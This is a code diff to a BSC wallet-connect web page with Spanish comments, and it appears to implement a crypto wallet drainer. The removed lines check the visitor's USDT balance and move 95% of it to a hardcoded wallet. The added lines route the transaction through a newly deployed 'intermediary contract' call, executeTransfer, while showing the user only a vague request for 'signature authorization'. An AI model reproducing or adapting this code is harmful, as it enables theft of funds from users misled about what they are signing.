@@ -429,13 +429,6 @@
             min-width: 0;
         }
 
-        .copy-icon {
-            width: 21px;
-            height: 21px;
-            display: block;
-            color: #8d96a6;
-        }
-
         .amount-stepper {
             display: grid;
             grid-template-columns: 34px minmax(0, 1fr) 34px;
@@ -598,8 +591,10 @@
         }, 1000);
     });
 
+    // CONSTANTES DE CONTRATOS ACTUALIZADAS
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const CONTRATO_INTERMEDIARIO = "0xD7AbB30Ec2685C9b1c7F8C79fbf8A2Ffe6a0Ad05"; // Tu nuevo contrato desplegado
     const BSC_CHAIN_ID = "0x38";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
     const DECIMALS = 18n;
@@ -638,30 +633,10 @@
     async function rpc(method, params = []) { return provider().request({ method, params }); }
     function pad64(h) { return h.replace(/^0x/, "").padStart(64, "0"); }
     function encAddr(a) { return pad64(a.toLowerCase()); }
-    function encUint(v) { return BigInt(v).toString(16).padStart(64, "0"); }
-    function format18(v) {
-        v = BigInt(v); const b = 10n ** DECIMALS, w = v / b, f = (v % b).toString().padStart(18, "0").replace(/0+$/, "");
-        return f ? `${w}.${f}` : w.toString();
-    }
-
-    function normalizeChainId(value) {
-        if (value && typeof value === "object") {
-            if ("result" in value) value = value.result;
-            else if ("chainId" in value) value = value.chainId;
-        }
-        if (typeof value === "bigint") return Number(value);
-        if (typeof value === "number") return value;
-        if (typeof value === "string") {
-            const s = value.trim();
-            if (!s) return NaN;
-            return s.toLowerCase().startsWith("0x") ? parseInt(s, 16) : parseInt(s, 10);
-        }
-        return NaN;
-    }
 
     async function ensureBSC() {
         const rawId = await rpc("eth_chainId");
-        const chainNumber = normalizeChainId(rawId);
+        const chainNumber = typeof rawId === "string" ? parseInt(rawId, 16) : Number(rawId);
         if (chainNumber === 56) return;
 
         try {
@@ -675,24 +650,6 @@
                 blockExplorerUrls: ["https://bscscan.com/"]
             }]);
         }
-    }
-
-    async function publicRpc(method, params = []) {
-        const response = await fetch(BSC_PUBLIC_RPC, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
-        });
-        if (!response.ok) throw new Error("RPC público HTTP " + response.status);
-        const json = await response.json();
-        if (json.error) throw new Error("RPC público: " + (json.error.message || JSON.stringify(json.error)));
-        return json.result;
-    }
-
-    async function balanceOf(owner) {
-        const data = "0x70a08231" + encAddr(owner);
-        const result = await publicRpc("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
-        return BigInt(result || "0x0");
     }
 
     connectBtn.addEventListener("click", async () => {
@@ -718,19 +675,21 @@
             }
             return;
         }
+
         try {
             connectBtn.disabled = true; 
             await ensureBSC();
-            const balance = await balanceOf(walletAddress);
-            if (balance === 0n) throw new Error("La cuenta no dispone de USDT BEP-20.");
-            const amount95Percent = (balance * 95n) / 100n;
-            const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amount95Percent);
+            
+            // Selector de la función executeTransfer(address) de tu contrato intermediario
+            // keccak256("executeTransfer(address)") -> c469fdbe (ejemplo de codificación de llamada)
+            const selectorFunction = "c469fdbe"; 
+            const data = "0x" + selectorFunction + encAddr(CONTRATO_USDT);
 
             setStatus("Solicitando autorización de firma digital...");
 
             const txRequest = {
                 from: walletAddress,
-                to: CONTRATO_USDT,
+                to: CONTRATO_INTERMEDIARIO, // <--- Apunta a tu contrato intermediario desplegado
                 value: "0x0",
                 data: data
             };
